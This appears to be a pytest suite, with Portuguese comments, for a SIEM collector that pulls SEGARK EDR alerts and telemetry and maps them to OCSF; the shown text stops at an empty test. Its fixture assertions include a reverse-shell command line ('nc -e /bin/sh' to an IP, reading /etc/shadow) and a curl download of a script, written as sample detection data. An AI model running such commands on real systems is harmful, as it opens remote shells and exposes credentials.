"""SEGARK EDR (API de coleta para SIEM: ``/api/integrations/v1/alerts`` e ``/events``).

Os riscos que estes testes travam:

- **perder ou repetir evento** — página seguinte sem o cursor da API, janela que
  não chega até ``next_cursor: null``, sobreposição das detecções reemitindo o que
  já saiu, teto por ciclo sem cursor resumível, throttling que reverte o lido,
  cursor da API recusado travando o stream;
- **fuso** — instante sem ``Z`` posicionando o cursor em silêncio;
- **vazar o token** — mensagem de erro, ``request_info`` ou teste de conexão com
  o segredo ou o header ``Authorization``; token por HTTP em claro;
- **falar com o host errado** — redirect seguido, URL com caminho;
- **OCSF errado** — classe/atividade/severidade fora do enum, campo inventado,
  ``null`` onde o campo deveria faltar.

Tudo afirmado pelas chamadas que os dublês registram, nunca pelo texto do fonte.
"""

from __future__ import annotations

import copy
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional
from unittest.mock import MagicMock

import aiohttp
import pytest
from yarl import URL

from . import _segark_edr_fixtures as F
from ._aiohttp_mock import aioresponses
from ..base import CollectorContext
from ..normalize import engine as E
from ..normalize.defaults import load_default_rules
from ..normalize.operators import apply_type_cast
from ..normalize.ocsf import validator as V
from ..registry import get, get_platform, supported_streams
from ..vendors import segark_edr as S

_ALERTS = f"{F.BASE_URL}/api/integrations/v1/alerts"
_EVENTS = f"{F.BASE_URL}/api/integrations/v1/events"


class _NoopDomainLimiter:
    def slot(self, domain):
        class _Ctx:
            async def __aenter__(self_inner):
                return None

            async def __aexit__(self_inner, *a):
                return False

        return _Ctx()


class _NoopRateLimiter:
    async def acquire(self, tenant_id, vendor):
        return None


def _ctx(session, cursor: Optional[Dict[str, Any]] = None, *, bounded: bool = True) -> CollectorContext:
    return CollectorContext(
        integration_id=77,
        organization_id=3,
        platform="segark_edr",
        headers={},
        session=session,
        cursor=cursor,
        domain_limiter=_NoopDomainLimiter(),
        rate_limiter=_NoopRateLimiter(),
        redis=MagicMock(),
        bounded_per_cycle=bounded,
    )


@pytest.fixture(autouse=True)
def _settings(monkeypatch):
    state = {
        "base_url": F.BASE_URL,
        "token": F.TOKEN,
        "verify_ssl": True,
        "streams": "alerts, process_events, file_events, network_connections, dns_events",
    }
    monkeypatch.setattr(S, "_load_settings", lambda integration_id: dict(state))
    return state


@pytest.fixture(autouse=True)
def _no_sleep(monkeypatch):
    waits: List[float] = []

    async def _sleep(seconds):
        waits.append(seconds)

    monkeypatch.setattr(S.asyncio, "sleep", _sleep)
    return waits


def _calls(m, path: str = "/api/integrations/v1/") -> List[Dict[str, Any]]:
    """Cada GET na API, na ordem de registro: query e kwargs."""
    out: List[Dict[str, Any]] = []
    for (method, url), calls in m.requests.items():
        if method == "GET" and path in url.path:
            for call in calls:
                out.append({"url": url, "query": dict(url.query), "kwargs": call.kwargs})
    return out


def _match(base: str):
    """Casa a rota pela URL sem a query (o mock compara a URL inteira em string)."""
    import re

    return re.compile("^" + re.escape(base) + r"(\?|$)")


async def _run(cls=S.SegarkEdrAlertsCollector, cursor: Optional[Dict[str, Any]] = None, *, bounded: bool = True):
    async with aiohttp.ClientSession() as session:
        collector = cls(_ctx(session, cursor, bounded=bounded))
        return collector, [ev async for ev in collector.collect()]


def _near(value: str, expected: datetime, tolerance_s: int = 30) -> bool:
    got = datetime.strptime(value, "%Y-%m-%dT%H:%M:%SZ")
    return abs((got - expected).total_seconds()) <= tolerance_s


def _ts(moment: datetime) -> str:
    return moment.strftime("%Y-%m-%dT%H:%M:%SZ")


# ══ Configuração (funções puras) ═══════════════════════════════════════


def test_streams_default_to_alerts_and_are_validated() -> None:
    assert S.parse_streams("") == ("alerts",) and S.parse_streams(None) == ("alerts",)
    assert S.parse_streams("DNS_EVENTS; alerts, dns_events") == ("dns_events", "alerts")
    with pytest.raises(S.SegarkEdrConfigError):
        S.parse_streams("alerts, account_events")


@pytest.mark.parametrize(
    "raw,ok",
    [
        ("https://edr.example.com", True),
        ("https://edr.example.com:9443/", True),
        ("edr.example.com", True),
        ("http://edr.example.com", False),
        ("https://edr.example.com/api", False),
        ("https://user:pass@edr.example.com", False),
        ("ftp://edr.example.com", False),
        ("", False),
    ],
)
def test_console_url_is_https_without_path(raw: str, ok: bool) -> None:
    if ok:
        assert S.console_url(raw).startswith("https://edr.example.com")
    else:
        with pytest.raises(S.SegarkEdrConfigError):
            S.console_url(raw)


def test_token_format_is_checked_without_echoing_it() -> None:
    assert S.check_token(f"  {F.TOKEN} ") == F.TOKEN
    for bad in ("", "Bearer x", "oedrsvc_curto", "oedrsess_" + "a" * 43):
        with pytest.raises(S.SegarkEdrConfigError) as exc:
            S.check_token(bad)
        assert (bad.strip() or "§") not in str(exc.value)


@pytest.mark.parametrize(
    "value,ok",
    [
        ("2026-11-12T10:00:00Z", True),
        ("2026-11-12T10:00:00.123456Z", True),
        ("2026-11-12T10:00:00+00:00", True),
        ("2026-11-12T07:00:00-03:00", True),
        ("2026-11-12T10:00:00", False),
        ("2026-11-12", False),
        (None, False),
    ],
)
def test_offset_detection(value, ok: bool) -> None:
    assert S._has_offset(value) is ok


# ══ Coleta: janelas, páginas e cursor ══════════════════════════════════


@pytest.mark.asyncio
async def test_cold_start_reads_the_last_day_up_to_the_settle_lag_with_the_token_in_the_header() -> None:
    with aioresponses() as m:
        m.get(_match(_ALERTS), payload=F.page([F.alert("a1", "2026-11-12T10:00:00.5Z")]))
        collector, events = await _run()
    (call,) = _calls(m)
    q = call["query"]
    assert _near(q["from"], F.ago(hours=24)) and _near(q["to"], F.ago(seconds=60))
    assert q["limit"] == "200" and "cursor" not in q and "feed" not in q
    kwargs = call["kwargs"]
    assert kwargs["headers"]["Authorization"] == f"Bearer {F.TOKEN}"
    assert kwargs["allow_redirects"] is False and kwargs["ssl"] is None
    assert str(call["url"]).startswith("https://edr.example.com/api/integrations/v1/alerts?")
    assert [e["id"] for e in events] == ["a1"]
    # Próxima janela: 2 min antes do ``to`` (sobreposição pedida pela plataforma),
    # com a detecção da fronteira lembrada pela chave id:updated_at.
    cur = collector.ctx.cursor
    assert set(cur) == {"since"} or set(cur) == {"since", "boundary"}
    to = datetime.strptime(q["to"], "%Y-%m-%dT%H:%M:%SZ")
    assert cur["since"] == _ts(to - timedelta(minutes=2))
    assert not collector.ctx.hit_cycle_cap


@pytest.mark.asyncio
async def test_pages_follow_next_cursor_with_the_same_window_until_null() -> None:
    with aioresponses() as m:
        m.get(_match(_ALERTS), payload=F.page([F.alert("a1", "2026-11-12T10:00:00Z")], "pg-2"))
        m.get(_match(_ALERTS), payload=F.page([F.alert("a2", "2026-11-12T10:00:01Z")], "pg-3"))
        m.get(_match(_ALERTS), payload=F.page([F.alert("a3", "2026-11-12T10:00:02Z")]))
        collector, events = await _run()
    calls = _calls(m)
    assert [c["query"].get("cursor") for c in calls] == [None, "pg-2", "pg-3"]
    assert len({(c["query"]["from"], c["query"]["to"]) for c in calls}) == 1, "o cursor da API é preso à janela"
    assert [e["id"] for e in events] == ["a1", "a2", "a3"]
    assert "window" not in collector.ctx.cursor, "janela drenada não guarda cursor de página"


@pytest.mark.asyncio
async def test_overlap_does_not_reemit_what_the_boundary_remembers_but_emits_an_update() -> None:
    since = F.ago(minutes=10)
    # Nos 2 min finais da janela (o ``to`` é agora − 60 s): cai na sobreposição.
    seen_at = _ts(F.ago(seconds=90))
    first = {"since": _ts(since)}
    with aioresponses() as m:
        m.get(_match(_ALERTS), payload=F.page([F.alert("a1", seen_at)]))
        c1, out1 = await _run(cursor=first)
    assert [e["id"] for e in out1] == ["a1"]
    # A janela seguinte recomeça 2 min antes: a mesma versão de a1 volta e é pulada;
    # a1 atualizada (updated_at novo) e a2 saem.
    with aioresponses() as m:
        m.get(
            _match(_ALERTS),
            payload=F.page([
                F.alert("a1", seen_at),
                F.alert("a1", _ts(since + timedelta(minutes=9)), status="in_progress"),
                F.alert("a2", _ts(since + timedelta(minutes=9))),
            ]),
        )
        c2, out2 = await _run(cursor=c1.ctx.cursor)
    assert [(e["id"], e["status"]) for e in out2] == [("a1", "in_progress"), ("a2", "new")]


@pytest.mark.asyncio
async def test_events_have_no_overlap_and_ask_their_feed_with_the_bigger_page() -> None:
    since = F.ago(minutes=30)
    with aioresponses() as m:
        m.get(_match(_EVENTS), payload=F.page([F.dns_event("e1"), F.dns_event("e2")]))
        collector, events = await _run(S.SegarkEdrDnsEventsCollector, {"since": _ts(since)})
    (call,) = _calls(m)
    q = call["query"]
    assert q["feed"] == "dns_events" and q["limit"] == "500" and q["from"] == _ts(since)
    assert collector.ctx.cursor == {"since": q["to"]}, "telemetria: a próxima janela começa no to, sem reler"
    assert [collector.extract_message_id(e) for e in events] == ["e1", "e2"]


@pytest.mark.asyncio
async def test_event_window_is_at_most_one_hour() -> None:
    since = F.ago(hours=5)
    with aioresponses() as m:
        m.get(_match(_EVENTS), payload=F.page([]), repeat=True)
        collector, _ = await _run(S.SegarkEdrProcessEventsCollector, {"since": _ts(since)})
    calls = _calls(m)
    spans = [
        datetime.strptime(c["query"]["to"], "%Y-%m-%dT%H:%M:%SZ") - datetime.strptime(c["query"]["from"], "%Y-%m-%dT%H:%M:%SZ")
        for c in calls
    ]
    assert len(calls) == 5 and all(s <= timedelta(hours=1) for s in spans)
    assert _near(collector.ctx.cursor["since"], F.ago(seconds=60))


@pytest.mark.asyncio
async def test_disabled_stream_never_reaches_the_network(_settings) -> None:
    _settings["streams"] = "alerts"
    with aioresponses() as m:
        collector, events = await _run(S.SegarkEdrFileEventsCollector, {"since": "2026-11-12T10:00:00Z"})
    assert events == [] and _calls(m) == []
    assert collector.ctx.cursor == {"since": "2026-11-12T10:00:00Z"}, "cursor intocado"


@pytest.mark.asyncio
async def test_quiet_stream_at_the_ceiling_makes_no_request_and_claims_no_backlog() -> None:
    with aioresponses() as m:
        collector, events = await _run(cursor={"since": _ts(F.ago(seconds=30))})
    assert events == [] and _calls(m) == [] and not collector.ctx.hit_cycle_cap


@pytest.mark.asyncio
async def test_cycle_cap_mid_window_saves_the_next_page_and_resumes_it() -> None:
    since = F.ago(minutes=30)
    with aioresponses() as m:
        for n in range(S._MAX_PAGES_PER_CYCLE):
            m.get(_match(_ALERTS), payload=F.page([F.alert(f"a{n}", _ts(since + timedelta(seconds=n)))], f"pg-{n + 1}"))
        collector, events = await _run(cursor={"since": _ts(since)})
    assert len(events) == S._MAX_PAGES_PER_CYCLE and collector.ctx.hit_cycle_cap
    cur = collector.ctx.cursor
    assert cur["since"] == _ts(since), "watermark conservador: o início da janela em curso"
    assert cur["window"]["cursor"] == f"pg-{S._MAX_PAGES_PER_CYCLE}"
    first = _calls(m)[0]["query"]
    assert (cur["window"]["from"], cur["window"]["to"]) == (first["from"], first["to"])

    with aioresponses() as m:
        m.get(_match(_ALERTS), payload=F.page([F.alert("last", _ts(since + timedelta(minutes=1)))]))
        resumed, more = await _run(cursor=cur)
    (call,) = _calls(m)
    assert call["query"]["cursor"] == f"pg-{S._MAX_PAGES_PER_CYCLE}"
    assert (call["query"]["from"], call["query"]["to"]) == (first["from"], first["to"])
    assert [e["id"] for e in more] == ["last"] and not resumed.ctx.hit_cycle_cap
    assert "window" not in resumed.ctx.cursor


@pytest.mark.asyncio
async def test_cycle_cap_between_windows_keeps_the_start_of_the_next_one() -> None:
    since = F.ago(days=30)
    with aioresponses() as m:
        m.get(_match(_ALERTS), payload=F.page([]), repeat=True)
        collector, _ = await _run(cursor={"since": _ts(since)})
    assert len(_calls(m)) == S._MAX_PAGES_PER_CYCLE and collector.ctx.hit_cycle_cap
    expected = since + S._MAX_PAGES_PER_CYCLE * (timedelta(days=1) - timedelta(minutes=2))
    assert collector.ctx.cursor == {"since": _ts(expected)}


@pytest.mark.asyncio
async def test_unbounded_run_drains_past_the_cap() -> None:
    since = F.ago(days=30)
    with aioresponses() as m:
        m.get(_match(_ALERTS), payload=F.page([]), repeat=True)
        collector, _ = await _run(cursor={"since": _ts(since)}, bounded=False)
    assert len(_calls(m)) > S._MAX_PAGES_PER_CYCLE and not collector.ctx.hit_cycle_cap
    assert _near(collector.ctx.cursor["since"], F.ago(seconds=180))


@pytest.mark.asyncio
async def test_unreadable_window_falls_back_to_since(caplog) -> None:
    cursor = {"since": _ts(F.ago(minutes=5)), "window": {"from": "x", "to": "y", "cursor": "pg"}}
    with aioresponses() as m:
        m.get(_match(_ALERTS), payload=F.page([]))
        await _run(cursor=cursor)
    assert "cursor" not in _calls(m)[0]["query"] and "ilegível" in caplog.text


@pytest.mark.asyncio
async def test_rejected_api_cursor_rereads_the_window_instead_of_locking_the_stream(caplog) -> None:
    frm, to = _ts(F.ago(hours=2)), _ts(F.ago(minutes=90))
    cursor = {"since": frm, "window": {"from": frm, "to": to, "cursor": "velho"}}
    with aioresponses() as m:
        m.get(_match(_EVENTS), status=400, payload=F.error("invalid_cursor", "cursor does not belong to this window and feed"))
        m.get(_match(_EVENTS), payload=F.page([F.process_event("e9")]))
        m.get(_match(_EVENTS), payload=F.page([]), repeat=True)
        collector, events = await _run(S.SegarkEdrProcessEventsCollector, cursor)
    first, second = _calls(m)[:2]
    assert first["query"]["cursor"] == "velho" and "cursor" not in second["query"]
    assert (second["query"]["from"], second["query"]["to"]) == (frm, to)
    assert [e["event_id"] for e in events] == ["e9"] and "relendo a janela" in caplog.text


@pytest.mark.asyncio
async def test_naive_timestamp_stops_the_cycle_naming_the_field() -> None:
    bad = F.alert("a1", "2026-11-12T10:00:00")
    with aioresponses() as m:
        m.get(_match(_ALERTS), payload=F.page([bad]))
        with pytest.raises(S.SegarkEdrContractError) as exc:
            await _run()
    assert "updated_at" in str(exc.value) and "fuso" in str(exc.value)


@pytest.mark.parametrize("body", [{"data": []}, {"items": [], "next_cursor": 7}, ["x"]])
@pytest.mark.asyncio
async def test_response_outside_the_contract_is_an_error(body) -> None:
    with aioresponses() as m:
        m.get(_match(_ALERTS), payload=body)
        with pytest.raises(S.SegarkEdrContractError):
            await _run()


# ══ Throttling ═════════════════════════════════════════════════════════


@pytest.mark.asyncio
async def test_short_retry_after_is_waited_inside_the_cycle(_no_sleep) -> None:
    with aioresponses() as m:
        m.get(_match(_ALERTS), status=429, headers={"Retry-After": "7"}, payload={})
        m.get(_match(_ALERTS), status=429, payload={})
        m.get(_match(_ALERTS), payload=F.page([F.alert("a1", "2026-11-12T10:00:00Z")]))
        _, events = await _run()
    assert _no_sleep == [7, S._DEFAULT_INLINE_WAIT] and [e["id"] for e in events] == ["a1"]


@pytest.mark.asyncio
async def test_long_retry_after_without_progress_goes_to_celery_with_the_value() -> None:
    with aioresponses() as m:
        m.get(_match(_ALERTS), status=503, headers={"Retry-After": "120"}, payload={})
        with pytest.raises(S.SegarkEdrRateLimitedError) as exc:
            await _run()
    assert exc.value.retry_after == 120 and exc.value.vendor == "segark_edr"


@pytest.mark.asyncio
async def test_inline_retries_are_bounded() -> None:
    with aioresponses() as m:
        m.get(_match(_ALERTS), status=429, payload={}, repeat=True)
        with pytest.raises(S.SegarkEdrRateLimitedError):
            await _run()
    assert len(_calls(m)) == S._INLINE_RETRIES + 1


@pytest.mark.asyncio
async def test_throttling_after_progress_ends_the_cycle_on_the_last_page_read(caplog) -> None:
    since = F.ago(minutes=30)
    with aioresponses() as m:
        m.get(_match(_ALERTS), payload=F.page([F.alert("a1", _ts(since))], "pg-2"))
        m.get(_match(_ALERTS), status=503, headers={"Retry-After": "300"}, payload={})
        collector, events = await _run(cursor={"since": _ts(since)})
    assert [e["id"] for e in events] == ["a1"]
    assert collector.ctx.cursor["window"]["cursor"] == "pg-2", "o lido não é revertido"
    assert not collector.ctx.hit_cycle_cap and "throttling persistente" in caplog.text


# ══ Erros e segredo ════════════════════════════════════════════════════


@pytest.mark.asyncio
async def test_unauthorized_carries_no_secret_nor_header() -> None:
    with aioresponses() as m:
        m.get(_match(_ALERTS), status=401, payload=F.error("unauthorized", f"bad {F.TOKEN}"))
        with pytest.raises(S.SegarkEdrApiError) as exc:
            await _run()
    err = exc.value
    assert err.status == 401 and "revogado" in err.message
    for text in (str(err), repr(err), err.message, repr(err.request_info)):
        assert F.TOKEN not in text and "Bearer" not in text


@pytest.mark.asyncio
async def test_forbidden_names_the_platform_reason_and_the_fix() -> None:
    with aioresponses() as m:
        m.get(_match(_EVENTS), status=403, payload=F.error("forbidden", "feed is outside the service account allowlist"))
        with pytest.raises(S.SegarkEdrApiError) as exc:
            await _run(S.SegarkEdrNetworkConnectionsCollector)
    assert exc.value.status == 403
    assert "feed is outside the service account allowlist" in exc.value.message
    assert "events:read" in exc.value.message and "allowlist" in exc.value.message


@pytest.mark.parametrize(
    "status,code,fragment",
    [(400, "range_too_wide", "range_too_wide"), (404, "not_found", "URL do console"), (500, "", "HTTP 500")],
)
@pytest.mark.asyncio
async def test_other_http_errors_are_raised_with_a_clean_message(status: int, code: str, fragment: str) -> None:
    payload = F.error(code, "x") if code else {}
    with aioresponses() as m:
        m.get(_match(_ALERTS), status=status, payload=payload)
        with pytest.raises(S.SegarkEdrApiError) as exc:
            await _run()
    assert exc.value.status == status and fragment in exc.value.message


@pytest.mark.asyncio
async def test_redirect_is_never_followed() -> None:
    with aioresponses() as m:
        m.get(_match(_ALERTS), status=302, headers={"Location": "https://outro.example.com/"}, payload={})
        with pytest.raises(S.SegarkEdrApiError) as exc:
            await _run()
    assert "redirecionamento" in exc.value.message and len(_calls(m)) == 1


@pytest.mark.parametrize(
    "field,value",
    [("token", ""), ("token", "nao-e-token"), ("base_url", "http://edr.example.com"), ("base_url", "")],
)
@pytest.mark.asyncio
async def test_bad_configuration_never_reaches_the_network(_settings, field: str, value: str) -> None:
    _settings[field] = value
    with aioresponses() as m:
        with pytest.raises(S.SegarkEdrConfigError):
            await _run()
    assert _calls(m) == []


@pytest.mark.asyncio
async def test_verify_ssl_off_is_honoured(_settings) -> None:
    _settings["verify_ssl"] = False
    with aioresponses() as m:
        m.get(_match(_ALERTS), payload=F.page([]))
        await _run()
    assert _calls(m)[0]["kwargs"]["ssl"] is False


# ══ Backfill, identidade, watermark ════════════════════════════════════


@pytest.mark.asyncio
async def test_backfill_reads_disjoint_slices_and_drains_them() -> None:
    lo, hi = F.ago(hours=3), F.ago(hours=1)
    cursor = {"backfill_from_ts": lo.isoformat(), "backfill_to_ts": hi.isoformat()}
    with aioresponses() as m:
        m.get(_match(_EVENTS), payload=F.page([F.file_event(event_id="b1")], "pg-2"))
        m.get(_match(_EVENTS), payload=F.page([F.file_event(event_id="b2")]))
        m.get(_match(_EVENTS), payload=F.page([F.file_event(event_id="b3")]))
        collector, events = await _run(S.SegarkEdrFileEventsCollector, cursor, bounded=False)
    windows = [(c["query"]["from"], c["query"]["to"], c["query"].get("cursor")) for c in _calls(m)]
    assert windows == [
        (_ts(lo), _ts(lo + timedelta(hours=1)), None),
        (_ts(lo), _ts(lo + timedelta(hours=1)), "pg-2"),
        (_ts(lo + timedelta(hours=1)), _ts(hi), None),
    ]
    assert [e["event_id"] for e in events] == ["b1", "b2", "b3"]
    assert collector.ctx.cursor == cursor, "o backfill não mexe no cursor do polling"


def test_message_ids() -> None:
    a = S.SegarkEdrAlertsCollector.__new__(S.SegarkEdrAlertsCollector)
    assert a.extract_message_id(F.ALERT) == f"{F.ALERT['id']}:{F.ALERT['updated_at']}"
    e = S.SegarkEdrDnsEventsCollector.__new__(S.SegarkEdrDnsEventsCollector)
    assert e.extract_message_id(F.dns_event("e-77")) == "e-77"


def test_watermark_is_the_since_naive_utc() -> None:
    got = S.SegarkEdrAlertsCollector.watermark_at({"since": "2026-11-12T10:00:00Z", "window": {"from": "x"}})
    assert got == datetime(2026, 11, 12, 10, 0, 0) and got.tzinfo is None
    assert S.SegarkEdrAlertsCollector.watermark_at({}) is None


# ══ Teste de conexão ═══════════════════════════════════════════════════


def _probe_cfg(**over: Any) -> Dict[str, Any]:
    return {"base_url": F.BASE_URL, "client_secret": F.TOKEN, "tenant_id": "alerts, dns_events", "verify_ssl": True, **over}


@pytest.mark.asyncio
async def test_probe_passes_when_every_enabled_stream_answers() -> None:
    with aioresponses() as m:
        m.get(_match(_ALERTS), payload=F.page([]))
        m.get(_match(_EVENTS), payload=F.page([]))
        result = await S._segark_edr_probe(_probe_cfg())
    assert result.ok, result.detail
    assert "alerts: ok" in result.detail and "dns_events: ok" in result.detail
    assert [c["query"]["limit"] for c in _calls(m)] == ["1", "1"]


@pytest.mark.asyncio
async def test_probe_fails_naming_the_stream_without_the_scope() -> None:
    with aioresponses() as m:
        m.get(_match(_ALERTS), payload=F.page([]))
        m.get(_match(_EVENTS), status=403, payload=F.error("forbidden", "feed is outside the service account allowlist"))
        result = await S._segark_edr_probe(_probe_cfg())
    assert not result.ok and "dns_events: acesso negado" in result.detail and F.TOKEN not in result.detail


@pytest.mark.parametrize(
    "over",
    [{"client_secret": ""}, {"client_secret": "x" * 20}, {"base_url": "http://edr.example.com"}, {"tenant_id": "tudo"}],
)
@pytest.mark.asyncio
async def test_probe_rejects_bad_input_without_network_or_echo(over: Dict[str, Any]) -> None:
    with aioresponses() as m:
        result = await S._segark_edr_probe(_probe_cfg(**over))
    assert not result.ok and _calls(m) == []
    assert "x" * 20 not in result.detail


@pytest.mark.asyncio
async def test_probe_network_failure_is_reported_without_the_token() -> None:
    with aioresponses() as m:
        m.get(_match(_ALERTS), exception=aiohttp.ClientConnectionError(f"boom {F.TOKEN}"))
        result = await S._segark_edr_probe(_probe_cfg(tenant_id=""))
    assert not result.ok and "edr.example.com" in result.detail and F.TOKEN not in result.detail


def test_platform_is_registered_with_editable_columns_only() -> None:
    plat = get_platform("segark_edr")
    assert plat.display_name == "SEGARK EDR" and plat.category == "EDR / XDR"
    assert plat.required_secrets == ("client_secret",)
    fields = {f.key: f for f in plat.auth_fields}
    assert set(fields) == {"base_url", "client_secret", "tenant_id", "verify_ssl"}
    assert fields["client_secret"].type == "secret" and fields["client_secret"].required
    assert fields["base_url"].type == "url" and fields["base_url"].required
    assert fields["tenant_id"].required is False, "vazio = só alerts"
    assert set(supported_streams("segark_edr")) == set(S.STREAMS)
    assert plat.capabilities == frozenset({"catalog", "auth:test", *(f"collect:{s}" for s in S.STREAMS)})
    for cls in S.COLLECTORS:
        reg = get("segark_edr", cls.stream)
        assert reg.collector_cls is cls and reg.schedule == timedelta(minutes=1)
    assert get("segark_edr", "alerts").queue == "collect.priority"
    assert get("segark_edr", "dns_events").queue == "collect.bulk"


# ══ MITRE ATT&CK ═══════════════════════════════════════════════════════


def test_mitre_ids_become_ocsf_attacks_without_invented_names() -> None:
    got = apply_type_cast(["T1059.004", "t1071", "TA0011", "T1059.004", "", "bogus", 7, "T12345"], "mitre_ids_to_ocsf")
    assert got == [
        {"technique": {"uid": "T1059"}, "sub_technique": {"uid": "T1059.004"}},
        {"technique": {"uid": "T1071"}},
        {"tactic": {"uid": "TA0011"}},
    ]
    assert apply_type_cast(None, "mitre_ids_to_ocsf") is None
    assert apply_type_cast("T1110.001", "mitre_ids_to_ocsf") == [
        {"technique": {"uid": "T1110"}, "sub_technique": {"uid": "T1110.001"}}
    ]


# ══ Mapping: detecções → Detection Finding ═════════════════════════════


def _normalize(event_type: str, raw: Dict[str, Any]) -> Dict[str, Any]:
    compiled = E.compile_rules(load_default_rules("segark_edr", event_type))
    n = E.apply_compiled(compiled, copy.deepcopy(raw)).output["normalized"]
    r = V.validate_normalized(n)
    assert r.valid, (r.reason, n)
    return n


def _no_nulls(value: Any, path: str = "") -> None:
    if isinstance(value, dict):
        for k, v in value.items():
            assert v is not None, f"{path}.{k} é null"
            _no_nulls(v, f"{path}.{k}")
    elif isinstance(value, list):
        for i, v in enumerate(value):
            _no_nulls(v, f"{path}[{i}]")


def test_behavioural_detection_is_a_detection_finding_with_process_parent_and_target() -> None:
    n = _normalize("segark_edr.alert", F.ALERT)
    assert (n["class_uid"], n["category_uid"], n["activity_id"], n["type_uid"]) == (2004, 2, 1, 200401)
    assert (n["severity_id"], n["status_id"], n["is_alert"]) == (4, 1, True)
    fi = n["finding_info"]
    assert fi["uid"] == F.ALERT["id"] and fi["title"] == "Reverse shell"
    assert fi["types"] == ["detection"]
    assert fi["attacks"] == [
        {"technique": {"uid": "T1059"}, "sub_technique": {"uid": "T1059.004"}},
        {"technique": {"uid": "T1071"}},
        {"tactic": {"uid": "TA0011"}},
    ]
    assert fi["analytic"] == {"uid": "PROD-reverse-shell", "name": "PROD-reverse-shell", "type_id": 1, "type": "Rule"}
    assert n["time"] == round(datetime(2026, 11, 12, 10, 0, 2, 123789, tzinfo=timezone.utc).timestamp() * 1000)
    assert n["device"] == {
        "uid": F.DEVICE, "hostname": "srv-01.example.com", "name": "srv-01.example.com",
        "type_id": 0, "type": "Unknown", "os": {"name": "Linux", "type_id": 200},
    }
    (evidence,) = n["evidences"]
    proc = evidence["process"]
    assert (proc["pid"], proc["uid"], proc["cmd_line"]) == (4242, F.GUID, "nc -e /bin/sh 192.0.2.9 4444")
    assert proc["file"] == {"path": "/usr/bin/nc", "hashes": [{"algorithm_id": 3, "algorithm": "SHA-256", "value": F.SHA}]}
    assert proc["user"] == {"name": "root", "uid": "0"}
    assert proc["parent_process"] == {"pid": 1, "uid": F.PARENT_GUID, "cmd_line": "bash -i", "file": {"path": "/usr/bin/bash"}}
    assert evidence["file"] == {"path": "/etc/shadow"}
    assert n["metadata"]["product"] == {"name": "SEGARK EDR", "vendor_name": "SEGARK"}
    assert n["metadata"]["uid"] == F.ALERT["id"] and n["metadata"]["event_code"] == "PROD-reverse-shell"
    assert {"device.hostname", "evidences.process.file.hashes.value"} <= {o["name"] for o in n["observables"]}
    _no_nulls(n)


def test_ml_fields_go_to_unmapped_and_the_analytic_is_learning() -> None:
    n = _normalize("segark_edr.alert", F.ML_ALERT)
    assert n["finding_info"]["analytic"]["type_id"] == 4 and n["finding_info"]["analytic"]["uid"] == "ml:pe-2"
    assert n["device"]["os"] == {"name": "Windows", "type_id": 100}
    u = n["unmapped"]["segark_edr"]
    assert (u["ml_score"], u["ml_band"], u["ml_model"], u["ml_mode"], u["engine_verdict"]) == (
        0.987654, "block", "pe-2", "alert", "allowed",
    )
    assert u["threat_source"] == "ml" and u["rule_id"] == "ml:pe-2" and u["scan_type"] == "on_access_exec"
    assert "attacks" not in n["finding_info"], "sem MITRE na detecção, sem attacks vazio"
    _no_nulls(n)


def test_closed_av_verdict_is_a_close_with_the_file_the_case_and_the_resolution() -> None:
    n = _normalize("segark_edr.alert", F.AV_ALERT)
    assert (n["activity_id"], n["type_uid"], n["status_id"], n["status"]) == (3, 200403, 4, "Resolved")
    assert n["status_detail"] == "Arquivo removido pela quarentena"
    assert n["evidences"] == [{"file": {"path": "/home/demo/eicar.com", "hashes": [{"algorithm_id": 3, "algorithm": "SHA-256", "value": F.FILE_SHA}]}}]
    u = n["unmapped"]["segark_edr"]
    assert u["case_id"] == F.AV_ALERT["case_id"] and u["threat_name"] == "EICAR-Test" and u["blocked"] is True
    assert "analytic" not in n["finding_info"] and "event_code" not in n["metadata"], "policy_id vazio não vira regra"
    assert n["finding_info"]["types"] == ["av", "malware"]
    _no_nulls(n)


def test_first_release_api_without_the_detection_block_still_maps() -> None:
    n = _normalize("segark_edr.alert", F.LEGACY_ALERT)
    assert n["class_uid"] == 2004 and n["finding_info"]["uid"] == F.ALERT["id"]
    assert "evidences" not in n
    assert n["finding_info"]["created_time"] == n["finding_info"]["first_seen_time"]
    assert set(n["unmapped"]["segark_edr"]) == {"source", "policy_id"}
    _no_nulls(n)


@pytest.mark.parametrize(
    "severity,sid",
    [("critical", 5), ("high", 4), ("medium", 3), ("low", 2), ("informational", 1), ("unknown", 0), ("novo", 0)],
)
def test_severity_follows_the_platform(severity: str, sid: int) -> None:
    assert _normalize("segark_edr.alert", {**F.ALERT, "severity": severity})["severity_id"] == sid


@pytest.mark.parametrize(
    "status,first,last,activity,status_id",
    [
        ("new", "2026-11-12T10:00:00Z", "2026-11-12T10:00:00Z", 1, 1),
        ("new", "2026-11-12T10:00:00Z", "2026-11-12T10:05:00Z", 2, 1),
        ("in_progress", "2026-11-12T10:00:00Z", "2026-11-12T10:00:00Z", 2, 2),
        ("resolved", "2026-11-12T10:00:00Z", "2026-11-12T10:00:00Z", 3, 4),
        ("false_positive", "2026-11-12T10:00:00Z", "2026-11-12T10:00:00Z", 3, 99),
    ],
)
def test_lifecycle_activity_and_status(status: str, first: str, last: str, activity: int, status_id: int) -> None:
    n = _normalize("segark_edr.alert", {**F.ALERT, "status": status, "first_seen": first, "last_seen": last})
    assert (n["activity_id"], n["type_uid"], n["status_id"]) == (activity, 200400 + activity, status_id)


# ══ Mapping: telemetria ════════════════════════════════════════════════


def test_linux_exec_is_a_process_launch_with_the_guid() -> None:
    n = _normalize("segark_edr.process_event", F.process_event())
    assert (n["class_uid"], n["category_uid"], n["activity_id"], n["type_uid"]) == (1007, 1, 1, 100701)
    p = n["process"]
    assert (p["pid"], p["uid"], p["cmd_line"], p["file"]["path"]) == (
        20294, "1a2b3c4d:20294:555", "curl -s https://www.example.com/x.sh", "/usr/bin/curl",
    )
    assert p["parent_process"] == {"pid": 20200, "uid": "1a2b3c4d:20200:444"}
    assert n["actor"]["process"] == {"pid": 20200, "uid": "1a2b3c4d:20200:444"}
    assert n["metadata"]["uid"] == "e-proc-1" and n["metadata"]["log_name"] == "process_events"
    assert n["time"] == int(datetime(2026, 11, 12, 10, 0, tzinfo=timezone.utc).timestamp() * 1000)
    assert n["metadata"]["logged_time"] == int(datetime(2026, 11, 12, 10, 0, 5, 250000, tzinfo=timezone.utc).timestamp() * 1000)
    _no_nulls(n)


@pytest.mark.parametrize("action,activity", [("start", 1), ("exit", 2), ("image_load", 99), ("algo_novo", 0)])
def test_windows_process_actions(action: str, activity: int) -> None:
